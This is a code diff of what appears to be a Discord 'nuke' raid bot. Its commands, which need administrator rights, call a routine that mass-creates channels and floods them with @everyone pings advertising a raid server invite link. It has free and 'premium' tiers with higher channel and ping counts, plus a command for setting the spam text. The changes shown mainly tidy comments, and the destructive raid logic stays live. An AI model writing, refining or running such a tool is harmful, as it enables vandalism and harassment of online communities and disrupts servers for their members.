@@ -19,8 +19,6 @@ LOG_CHANNEL_ID = 1458257075393003561
 # --- NUKE COMMAND TEXTS & CONFIG ---
 NORMAL_NUKE_CHANNEL_NAME = "raid-by-del1rium"
 NORMAL_NUKE_TEXT = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
-
-# Default configuration for the premium nuke. Can be changed by premium users.
 PREMIUM_CHANNEL_NAME = "premium-raid"
 PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2"
 RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"
@@ -65,12 +63,11 @@ async def custom_help(ctx):
     await asyncio.sleep(60)
     await help_message.delete()
 
-# --- NUKE COMMANDS (CORRECTED LOGIC) ---
+# --- NUKE COMMANDS ---
 @bot.command(name='nuke')
 async def nuke_normal(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
-    # Now passing the FIXED normal parameters
     await execute_nuke(ctx, NORMAL_NUKE_CHANNEL_NAME, NORMAL_NUKE_TEXT, 25, 500, is_premium=False)
 
 @bot.command(name='premiumnuke')
@@ -78,7 +75,6 @@ async def nuke_normal(ctx):
 async def premium_nuke(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
-    # Passing the CONFIGURABLE premium parameters
     await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)
 
 # --- CONFIGURATION COMMAND (PREMIUM) ---
@@ -87,8 +83,7 @@ async def premium_nuke(ctx):
 async def nuke_config(ctx, channel_name: str, *, spam_text: str):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
-    PREMIUM_CHANNEL_NAME = channel_name
-    PREMIUM_SPAM_TEXT = spam_text
+    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
     await ctx.message.delete()
     embed = discord.Embed(title="Premium Nuke Configuration Updated", color=discord.Color.gold())
     embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
@@ -146,6 +141,7 @@ async def create_and_spam(guild, channel_name, spam_text, index, num_pings):
     except Exception: pass
 
 async def spam_pings(channel, spam_text, amount):
+    # THIS IS THE CORRECTED LINE
     for _ in range(amount):
         try:
             asyncio.create_task(channel.send(spam_text))
